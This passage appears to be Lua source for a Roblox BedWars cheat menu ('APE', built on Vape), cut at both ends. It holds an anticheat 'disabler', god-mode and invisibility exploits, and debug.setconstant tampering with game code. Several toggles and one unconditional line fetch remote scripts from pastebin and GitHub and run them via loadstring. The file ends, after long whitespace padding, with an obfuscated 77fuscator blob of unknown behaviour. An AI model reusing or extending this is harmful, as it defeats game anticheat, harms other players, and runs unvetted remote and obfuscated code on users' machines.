		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if 1>bd then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,(((table.create or function(cs,ct)local cu,cv=0 while true do if cu<=1 then if cu~=1 then cv={}else for cw=1,cs do cv[cw]=ct;end;end else if 2==cu then return cv;else break end end cu=cu+1 end end))or tostring)else bl=1 end else if bd==2 then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if 2>bk then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if 5~=bk then for bj=0,(cv-1)do cw[bj]=bg(bj)end else cx=1 end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if bj~=2 then cx=cx+1 else da=bh(be(bi,cx,(cx+cz)-1),36)end end else if bj<=3 then cx=cx+cz else if 5~=bj then return da else break end end end bj=bj+1 end end else if 8~=bk then cs=bg(cy())else cu[1]=cs end end else if bk<=9 then while cx<#bi and#a==d do local a=cy()if cw[a]then ct=cw[a]else ct=cs..be(cs,1,1)end cw[cv]=cs..be(ct,1,1)cu[#cu+1],cs,cv=ct,ct,cv+1 end else if 10<bk then break else return bf(cu)end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if bd>4 then c={i,w,m,j,x,l,u,o,s,k,y,q,nil};else bo={}end else if bd<=6 then bp=v else if bd~=8 then bq=bp(bo)else br,bs=1,(-16154+(function()local a,b,c,d=0 while true do if a<=1 then if a>0 then d=(function(q,s,v)local w=0 while true do if w<1 then q(v(v,s,(s and s)),(q(q,v,(v and s))and v((q and q),v,q)),q(s,s,v))else break end w=w+1 end end)(function(q,s,v)local w=0 while true do if w<=2 then if w<=0 then if(b>189)then return q end else if 1==w then b=b+1 else c=((c+121)%9761)end end else if w<=3 then if((c%348)>=174)then return s(v((s and q),q,q),s(q,s,v),(s(s,v,q)and s(q,s,s)))else return s end else if 5>w then return s else break end end end w=w+1 end end,function(q,s,v)local w=0 while true do if w<=2 then if w<=0 then if b>223 then return q end else if 1==w then b=(b+1)else c=(((c*665))%49226)end end else if w<=3 then if((c%300)<=150)then return s else return s(s(s,(s and q),q),(q(s,(s and v),v)and q((s and s),v,s)),v(v,v,v))end else if w==4 then return s(s(v,q,q and q),q(v,q,(v and s)),v(q,q,s))else break end end end w=w+1 end end,function(q,s,v)local w=0 while true do if w<=2 then if w<=0 then if(b>218)then return q end else if w<2 then b=(b+1)else c=(c-194)%18562 end end else if w<=3 then if(c%714)<357 then c=((c-899)%47255)return v else return v(v(v,q,s and q),v(s,v,q)and q(s,v,v),q(q,q,q))end else if 4==w then return q(v(v,s,s),v(q,q,q),v(q,v,v))else break end end end w=w+1 end end)else b,c=0,1 end else if 2==a then return c;else break end end a=a+1 end end)())end end end end else if bd<=12 then if bd<=10 then if 10>bd then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if 1>c then d=0 else for q=0,31 do local s=a%2 local v=b%2 if not(s~=0)then if not(v~=1)then b=(b-1)d=d+2^q end else a=a-1 if not(v~=0)then d=(d+2^q)else b=(b-1)end end b=b/2 a=a/2 end end else if 2==c then return d else break end end c=c+1 end end end else if 12~=bd then bv=function(a,b)local c=0 while true do if c==0 then return(a*2^b);else break end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if 0==a then b,c=h(bn,br,br+2)else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=br+2;else if 4>a then return(bv(c,8))+b;else break end end end a=a+1 end end end end else if bd<=14 then if bd==13 then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if 1~=c then return p(a/2^b);else break end c=c+1 end end else if 17~=bd then bz=2^32-1 else ca=function(a,b)local c=0 while true do if c==0 then return((a+b)-bu(a,b))/2 else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if 19>bd then cb=bw()else cc=function(a,b)local c=0 while true do if 0<c then break else return bz-ca(bz-a,bz-b)end c=c+1 end end end else if 21>bd then cd=function(a,b,c)local d=0 while true do if d<1 then if c then local c=((a/(2^(b-1)))%2^((c-1)-(b-1)+1))return c-c%1 else local b=(2^(b-1))return((a%(b+b)>=b)and 1 or 0)end else break end d=d+1 end end else ce=bw()end end else if bd<=23 then if bd==22 then cf=function()local a,b,c,d,p=0 while true do if a<=1 then if 1>a then b,c,d,p=h(bn,br,br+3)else b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);end else if a<=2 then br=(br+4);else if a==3 then return(bv(p,24)+bv(d,16)+bv(c,8))+b;else break end end end a=a+1 end end else cg=function()local a,b=0 while true do if a<=1 then if 0==a then b=bu(h(bn,br,br),cb)else br=(br+1);end else if a==2 then return b;else break end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if 26>bd then ch=((-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then p=270 else q=540 end end end else if a<=7 then if a<=5 then s=12318 else if 7>a then v=385 else w=137 end end else if a<=8 then x=35083 else if a==9 then y=254 else be=340 end end end end else if a<=15 then if a<=12 then if 11<a then bg=170 else bf=2 end else if a<=13 then bh=19255 else if 15~=a then bi=1 else bj=423 end end end else if a<=18 then if a<=16 then bk=240 else if a==17 then bs=0 else bw,by=bs,bi end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if 1~=ce then cc(ca(ca,ca)and ca(ca,ca),cc(cc,(ca and ca))and cc(ca,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bk then local bk=bs while true do bk=(bk+bi)if not(bk~=bi)then return cc else break end end end else if 2>ce then bw=(bw+bi)else by=((by-bj)%bh)end end else if ce<=3 then if((by%be)<bg)then local be=bs while true do be=(be+bi)if((be>bf)or be==bf)then if(be<d)then return cc(ca(ca,(ca and cc)),cc(ca,ca))else break end else by=(by+y)%x end end else local x=bs while true do x=(x+bi)if(x<bf)then return cc else break end end end else if ce<5 then return ca else break end end end ce=ce+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bw>w)then local w=bs while true do w=w+bi if not(w~=bf)then break else return x end end end else if 2~=be then bw=bw+bi else by=((by*v)%s)end end else if be<=3 then if((by%q)>p)then local p=bs while true do p=(p+bi)if(p==bi or p<bi)then by=(by*b)%c else if not(not(p==d))then break else return x(y(x,y),x(y,x))end end end else local b=bs while true do b=b+bi if(b<bf)then return x else break end end end else if be~=5 then return y else break end end end be=be+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));else ci=((-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then b=40425 else c=236 end else if a<=2 then d=960 else if 4>a then p=1920 else q=33223 end end end else if a<=7 then if a<=5 then s=2 else if 7~=a then v=894 else w=201 end end else if a<=8 then x=3 else if a~=10 then y=1330 else be=5906 end end end end else if a<=15 then if a<=12 then if 11<a then bg=665 else bf=617 end else if a<=13 then bh=211 else if a==14 then bi=33389 else bj=787 end end end else if a<=18 then if a<=16 then bk=1 else if 18>a then bs=0 else bw,by=bs,bk end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if ce==0 then cc(cc(ca,ca),ca(cc,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bh then local bh=bs while true do bh=bh+bk if not(bh~=bk)then return cc else break end end end else if 1==ce then bw=(bw+bk)else by=((by-bj)%bi)end end else if ce<=3 then if(by%y)<bg then local y=bs while true do y=(y+bk)if(y==bk or y<bk)then by=(by*bf)%be else if not(y~=x)then break else return cc(cc(cc,cc),(ca(cc,cc)and cc(ca,cc)))end end end else local y=bs while true do y=(y+bk)if not(y~=s)then break else return cc end end end else if ce<5 then return cc else break end end end ce=ce+1 end end,function(y,be)local bf=0 while true do if bf<=2 then if bf<=0 then if(bw>w)then local w=bs while true do w=(w+bk)if not(not(w==s))then break else return be end end end else if bf==1 then bw=(bw+bk)else by=((by+v)%q)end end else if bf<=3 then if((by%p)>d)then local d=bs while true do d=(d+bk)if(d<bk or d==bk)then by=((by*c)%b)else if not(not(d==x))then break else return be(y(y,be and y),be(be,y))end end end else local b=bs while true do b=(b+bk)if b>bk then break else return y end end end else if 5~=bf then return y else break end end end bf=bf+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));end end end end else if bd<=31 then if bd<=28 then if bd<28 then cj=((-1671+(function()local a=409;local b=818;local c=28939;local d=222;local p=389;local q=38485;local s=1166;local v=583;local w=9454;local x=425;local y=4509;local be=442;local bf=292;local bg=3;local bh=1696;local bi=848;local bj=579;local bk=10108;local bs=252;local bw=908;local by=5205;local bz=470;local ca=746;local cc=1816;local ce=18568;local cs=2;local ct=1;local cu=421;local cv=0;local cw,cx=cv,ct;local a=(function(cy,cz,da,db)cy(cz(db,db,da,db),da(cz,cy,cz,db),da(da,cz,da,da),db(cz and cy,db,da,da))end)(function(cy,cz,da,db)if(cw>cu)then local cu=cv while true do cu=(cu+ct)if(cu<cs)then return cz else break end end end cw=cw+ct cx=(cx+ca)%ce if((cx%cc)==bw or(cx%cc)>bw)then local bw=cv while true do bw=bw+ct if(bw==ct or bw<ct)then cx=(cx-bz)%by else if not(bw~=cs)then return cz(cy(da,cy,cy,(cz and da)),da(cz,cz,cy,(da and db)),da(cy,db,cy,da),(cy(da,(db and cz),cz and da,cy)and cy((da and db),da and cy,db,da)))else break end end end else local bw=cv while true do bw=bw+ct if not(bw~=cs)then break else return cy end end end return cz end,function(bw,by,ca,cc)if cw>bs then local bs=cv while true do bs=bs+ct if not(bs~=cs)then break else return bw end end end cw=cw+ct cx=((cx-bj)%bk)if((cx%bh)==bi or(cx%bh)>bi)then local bh=cv while true do bh=bh+ct if(bh==cs or bh>cs)then if(bh<bg)then return ca else break end else cx=(cx*bf)%y end end else local y=cv while true do y=(y+ct)if(y<cs)then return bw(by(cc and by,bw and by,(ca and bw),bw),(cc(by,cc,by,(ca and cc))and ca(ca,cc,ca,ca)),ca(cc,bw and cc,bw,cc)and by(bw,bw and bw,ca,by),ca(ca,cc,(by and cc),ca))else break end end end return bw(ca(ca,by,ca and bw,cc),cc(ca,ca,cc,bw),bw(cc,cc,by,bw),by(bw,(bw and 